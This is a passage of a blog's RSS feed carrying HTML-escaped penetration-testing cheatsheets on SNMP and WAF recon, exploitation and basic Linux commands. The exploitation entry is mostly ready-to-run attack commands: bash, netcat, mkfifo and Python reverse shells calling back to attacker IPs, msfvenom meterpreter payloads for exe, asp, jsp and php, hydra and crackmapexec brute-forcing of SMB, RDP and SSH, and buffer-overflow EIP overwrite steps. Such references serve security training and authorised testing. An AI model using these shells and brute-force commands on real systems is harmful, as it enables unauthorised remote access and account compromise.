  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-snmp&quot;&gt;Hacktricks snmp&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.alvestrand.no/objectid/1.3.6.1.2&quot;&gt;objectid list&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;onesixtyone &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; comu.txt 172.16.1.0/24 &lt;span class=&quot;c&quot;&gt;# Search by open hosts with communities&lt;/span&gt;

snmpwalk &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public &lt;span class=&quot;nt&quot;&gt;-v1&lt;/span&gt; 172.16.1.4 1.3.6.1.4.1.77.1.2.25  &lt;span class=&quot;c&quot;&gt;# Search with public community and specific code&lt;/span&gt;

snmp-check 172.16.1.4 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public &lt;span class=&quot;c&quot;&gt;# Show info of host&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;waf-web-application-firewall&quot;&gt;WAF Web application firewall&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WAFW00F google.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="methodologies" /><category term="recon" /><category term="enumeration" /><summary type="html">This is a guide for exploitation</summary></entry><entry><title type="html">Exploitation</title><link href="http://localhost:4000/guide/2022/01/13/exploitation.html" rel="alternate" type="text/html" title="Exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/exploitation</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/exploitation.html">&lt;h2 id=&quot;public-exploits&quot;&gt;Public exploits&lt;/h2&gt;
&lt;p&gt;Links:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;www.exploit-db.com&quot;&gt;Exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;packetstormysecurity.com&quot;&gt;packetstormysecurity&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;securityfocus.com&quot;&gt;securityfocus&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;cve.mitre.org/cve/search_cve_list.html&quot;&gt;CVE Mitre&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;searchsploit&quot;&gt;Searchsploit&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit webmin
searchsploit webmin —exclude&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php|Dans&quot;&lt;/span&gt;
searchsploit &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; webmin :
searchsploit ipfire —id &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 42149 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;important&quot;&gt;&lt;strong&gt;Important!&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Always check the payloads.&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Check the dependencies libs,dll’s…&lt;/li&gt;
  &lt;li&gt;Always test before execute in the target.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;wordlists&quot;&gt;Wordlists&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;Seclist&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://wordlists.assetnote.io/&quot;&gt;assetnote&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 4444 &lt;span class=&quot;c&quot;&gt;# Open port&lt;/span&gt;

bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/172.100.50.0/4444 0&amp;gt;&amp;amp;1
nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 172.100.50.0 4444
/bin/sh | nc 127.0.0.1 5555
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 172.100.50.0 4444 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f &lt;span class=&quot;c&quot;&gt;# OpenBSD&lt;/span&gt;

python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.20.1.21&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;&lt;/span&gt; 

msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172.100.50.0 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reverse.exe &lt;span class=&quot;c&quot;&gt;# Meterpreter&lt;/span&gt;
msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;172.100.50.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; asp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.asp
msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;172.100.50.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.jsp
msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; php/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172.100.50.0 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell.php

python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Interactive shell&lt;/span&gt;
perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec &quot;/bin/sh&quot;;&apos;&lt;/span&gt;
ruby: &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;mutations&quot;&gt;Mutations&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;file —rules —stdout &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mutacao &lt;span class=&quot;c&quot;&gt;# New wordlist with variations of the first&lt;/span&gt;
nano /etc/john/john.conf → wordlist mode rules &lt;span class=&quot;c&quot;&gt;# Mutations personalized rules&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# ^[0-9] : 0 to 9 in the begin&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# $[0-9] : 0 to 9 in te final&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# $[@]$[0-9]$[0-9] : Add @ + 2 numbers in the end.&lt;/span&gt;

cewl google.com &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 7 &lt;span class=&quot;c&quot;&gt;# Find every word in the page with the lenght&lt;/span&gt;

crunch 10 10 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; rogerio^%% &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; wordlist &lt;span class=&quot;c&quot;&gt;# List based in patterns&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# % : Numbers.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# ^ : Special character.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# @ : Lower case character.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# , : Capital character.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;key-space-brute-force&quot;&gt;Key space brute force&lt;/h3&gt;
&lt;p&gt;All the possible variations.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 4 4 0123456789 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; pin &lt;span class=&quot;c&quot;&gt;# All combinations with 4 digits.&lt;/span&gt;

crunch 6 6 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; charset.lst numeric &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; pin &lt;span class=&quot;c&quot;&gt;# Use the crunch numeric pattern&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;brute-force&quot;&gt;Brute force&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; rogerio &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; admin 172.16.1.60 sbm &lt;span class=&quot;c&quot;&gt;#SMB&lt;/span&gt;
hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; pass.txt 172.16.1.60 sbm 
hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; alvos.txt sbm
hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; rdp_users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rdp_pass.txt rdp://172.16.1.188 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;c&quot;&gt;#RDP&lt;/span&gt;
hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; L users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; admin 172.16.1.5 ssh
hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password 172.16.1.5 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 5
    &lt;span class=&quot;c&quot;&gt;# -s : Set port.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# -t : Threads.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# -W : Sleep time beetwen tasks.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;winrm&quot;&gt;&lt;strong&gt;WinRM&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Link:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;[winrm-penetration-testing]https://www.hackingarticles.in/winrm-penetration-testing/
Windows Remote Management, is a command-line tool that enables administrators to remotely execute the CMD.exe commands using the WS-Management protocol. Port 5985/HTTP, 5986/HTTPS.
Evil-WinRM
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 172.16.1.140 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;rdp&quot;&gt;RDP&lt;/h3&gt;
&lt;p&gt;Active or disable rdp in windows&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Active
    &lt;ul&gt;
      &lt;li&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f&lt;/li&gt;
      &lt;li&gt;netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Disable
    &lt;ul&gt;
      &lt;li&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f&lt;/li&gt;
      &lt;li&gt;netsh advfirewall firewall set rule group=”remote desktop” new enable=No&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;crackmaexec&quot;&gt;crackmaexec&lt;/h3&gt;
&lt;p&gt;Swiss knife for pentest&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec &amp;lt;protocol&amp;gt; &amp;lt;target&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; username &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; password

crackmaexec smb 172.16.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jonh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;jonh@10&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Scan the network to the test all logins&lt;/span&gt;
crackmaexec smb 172.16.1.60 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jonh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;jonh@10&apos;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;whoami&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Execute this command&lt;/span&gt;

crackmaexec ldap 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;jonh@10&apos;&lt;/span&gt;
crackmaexec ldap 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; hashexemple

crackmaexec mssql 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; userfile &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; passwordfile &lt;span class=&quot;nt&quot;&gt;--no-bruteforce&lt;/span&gt;

crackmaexec winrm 192.168.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; userfile &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; passwordfile &lt;span class=&quot;nt&quot;&gt;--no-bruteforce&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;buffer-overflow&quot;&gt;Buffer overflow&lt;/h2&gt;

&lt;h3 id=&quot;pattern-offset&quot;&gt;Pattern offset&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/msf-patter_create &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 2200 &lt;span class=&quot;c&quot;&gt;# Create pattern&lt;/span&gt;
/usr/bin/msf-pattern_offset &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 2200 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 43396f43 &lt;span class=&quot;c&quot;&gt;# Find EIP overwrite&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.16 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nv&quot;&gt;exitfunc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;thread &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;gdblinux&quot;&gt;GDB/Linux&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./file
info functions               &lt;span class=&quot;c&quot;&gt;# Show functions&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel &lt;span class=&quot;c&quot;&gt;# Set flavor&lt;/span&gt;
disas main                   &lt;span class=&quot;c&quot;&gt;# Dissasembly specific funtion&lt;/span&gt;
b&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 0x5655621f                &lt;span class=&quot;c&quot;&gt;# Breakpoint&lt;/span&gt;
run &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot; * 200&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Input data&lt;/span&gt;
i r                          &lt;span class=&quot;c&quot;&gt;# Show registers(esp,eip,...)&lt;/span&gt;
x/16xw &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;                  &lt;span class=&quot;c&quot;&gt;# Specific memory zone&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;main                   &lt;span class=&quot;c&quot;&gt;# Brakpoint in the funtion&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x56556982        &lt;span class=&quot;c&quot;&gt;# Jump to specific function/zone&lt;/span&gt;
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot; * 136 + &quot;BBBB&quot; + &quot;\x70\x62\x55\x56&quot;&apos;&lt;/span&gt; | ./file &lt;span class=&quot;c&quot;&gt;# Send a specific number, that will allow overwrite and redirect the EIP.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="exploitation" /><summary type="html">This is a guide for exploitation</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/exploitation.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/exploitation.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Linux</title><link href="http://localhost:4000/cheatsheet/2022/01/13/linux.html" rel="alternate" type="text/html" title="Linux" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/linux</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/linux.html">&lt;h2 id=&quot;linux-enumerate&quot;&gt;Linux enumerate&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man &lt;span class=&quot;c&quot;&gt;# manual of programs&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Actula path.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#  Create directories&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List file&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Show permissions, users and group, lenght and date&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List hide files&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List hide and permisions&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Create a file&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Write in screen&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;exampletext &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file &lt;span class=&quot;c&quot;&gt;# Save in a file&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Read the file&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Do a copy&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;file file1 &lt;span class=&quot;c&quot;&gt;# Move/rename the file&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Read the first 5 lines&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; arquivoexemplo &lt;span class=&quot;c&quot;&gt;# Show in real time the end of file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;## Users&lt;/span&gt;
/ect/passwd &lt;span class=&quot;c&quot;&gt;# Users list file&lt;/span&gt;
adduser nome &lt;span class=&quot;c&quot;&gt;# Create user&lt;/span&gt;
deluser nome &lt;span class=&quot;c&quot;&gt;# delete user&lt;/span&gt;
adduser nome &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Change permission to sudo &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/log/auth.log &lt;span class=&quot;c&quot;&gt;# log of authentications &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;networks&quot;&gt;Networks&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig &lt;span class=&quot;c&quot;&gt;# Network informations&lt;/span&gt;
service serviceexample restart &lt;span class=&quot;c&quot;&gt;# restart a service&lt;/span&gt;
netstat &lt;span class=&quot;c&quot;&gt;# Network open ports and configurations&lt;/span&gt;
traceroute &lt;span class=&quot;c&quot;&gt;# Trace the packages using TTL(Time to live).&lt;/span&gt;
hping3# MOst &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;ping, can use SYN, port, etc.
host# Identify DNS.
netcat &lt;span class=&quot;c&quot;&gt;# Interacte and communicate with others services&lt;/span&gt;
- nc 10.0.0.0 443 
- nc vlp port &lt;span class=&quot;c&quot;&gt;# Open the port and listenin&lt;/span&gt;
- nc &lt;span class=&quot;nt&quot;&gt;-vnlup&lt;/span&gt; port &lt;span class=&quot;c&quot;&gt;# Open udp port&lt;/span&gt;
- nc &lt;span class=&quot;nt&quot;&gt;-vnu&lt;/span&gt; ip &lt;span class=&quot;c&quot;&gt;# Connection UDP&lt;/span&gt;
- nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ip port &amp;lt; file &lt;span class=&quot;c&quot;&gt;# Send a file.&lt;/span&gt;
- nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; port &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file &lt;span class=&quot;c&quot;&gt;# Receive a file.&lt;/span&gt;
- Portscan
    - nc &lt;span class=&quot;nt&quot;&gt;-vnz&lt;/span&gt; ip port &lt;span class=&quot;c&quot;&gt;# Ports and show the service. (z - scan)&lt;/span&gt;
    - nc &lt;span class=&quot;nt&quot;&gt;-vnz&lt;/span&gt; ip port-port 
